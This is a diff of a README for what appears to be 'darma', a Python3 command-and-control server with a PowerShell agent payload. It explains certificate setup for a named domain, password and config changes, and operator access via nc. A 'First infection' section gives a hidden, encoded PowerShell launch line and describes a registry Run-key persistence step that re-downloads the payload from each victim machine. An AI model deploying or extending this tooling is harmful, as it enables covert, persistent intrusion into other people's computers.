@@ -2,7 +2,7 @@
 
 Python3 C2 server and agent payload.
 
-uses HTTP protocol with checkin. Works in env with powershell constrained language mode.
+uses HTTP protocol with check-in. Works in env with powershell constrained language mode.
 
 Agent code can be delivered as in memory only or as is e.g in a hta file.
 
@@ -20,18 +20,16 @@ install requirements with pip3
 you will have to create valid https certs.
 Self signed certs wont work with powershell. will lose constrainedlanguagemode support to ignore ssl errors so use letsencrypt
 
-use ```certbot certonly --manual -d 220.ip-54-37-16.eu -d 220.ip-54-37-16.eu --register-unsafely-without-email ```
-and copy certs in same directory as "darma/listener.py"
+use ```certbot certonly --manual -d 220.ip-54-37-16.eu --register-unsafely-without-email ```
+and copy certs in "darma/certificates" and adjust config.py to point to them
 
-you will have to create valid https certs.
-change cert paths in "listener.py".  When server is deamonized its path will be changed to "/"
 
-## Change payload url
+## Change domain in config.py to match the ones of the certificates
 
 Change payload to point to your server url
 
 ## Change password of c2 server
-Change bcrpyt hash in "darma/command.py" with
+Change bcrpyt hash in "darma/config.py" with
 
 ```
 #Python3
@@ -61,7 +59,7 @@ nc ip_of_server 51251
 enter password and menu will pop up
 
 ## Logging
-logging can be found @ ```/var/log/aldebaran.log```
+if deamonized, logging can be found @ ```/var/log/aldebaran.log```
 
 ## First infection
 
@@ -77,5 +75,4 @@ C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -E
 When the victim checks in for the first time, an entry in ```HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run``` will be added that downloads the oneliner version of the payload
 
 ## TODO
-### Error check in menu
 ### Install script
